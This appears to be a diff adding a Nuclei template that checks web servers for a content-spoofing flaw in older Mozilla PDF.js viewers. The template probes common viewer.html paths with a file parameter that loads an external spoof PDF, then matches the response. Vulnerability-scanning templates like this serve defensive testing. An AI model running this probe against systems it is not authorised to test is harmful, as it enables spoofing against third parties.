@@ -1,0 +1,57 @@
+id: pdfjs-content-spoofing
+
+info:
+  name: Mozilla PDF.js - Content Spoofing
+  author: 0x_Akoko
+  severity: medium
+  description: |
+    Detected PDF.js viewer loads and renders external PDF files without proper origin validation. Versions < v1.3.91 are vulnerable to content spoofing attacks.
+  reference:
+    - https://groups.google.com/g/mozilla.dev.pdf-js/c/_WdU9T0TRfo
+    - https://github.com/mozilla/pdf.js/issues/6920
+  classification:
+    cwe-id: CWE-451
+  metadata:
+    verified: true
+    max-request: 5
+  tags: pdfjs,spoofing,headless
+
+headless:
+  - steps:
+      - args:
+          url: "{{BaseURL}}/{{path}}?file=https://raw.githubusercontent.com/projectdiscovery/nuclei-templates/main/helpers/payloads/mozila-content-spoof.pdf"
+        action: navigate
+
+      - action: waitload
+
+    payloads:
+      path:
+        - "pdf.js/web/viewer.html"
+        - "pdfjs/web/viewer.html"
+        - "web/viewer.html"
+        - "pdfjs-dist/web/viewer.html"
+        - "uiFramework/js/pdfjs/web/viewer.html"
+
+    stop-at-first-match: true
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "mozila-content-spoof.pdf"
+
+      - type: word
+        part: body
+        words:
+          - "pdf.js"
+
+      - type: word
+        part: body
+        negative: true
+        words:
+          - "file origin does not match"
+          - "blocked"
+          - "Not Found"
+        condition: or
+# digest: 490a0046304402207dc1eb1cfd5bc25039d729f591a15f5a9a37667ed6ad50d1c1c73fe20004b9a8022071080c75bcced708e51b213a2d9887954d7145d3666a5b1de77a04eb08905a67:922c64590222798bb761d5b6d8e72950
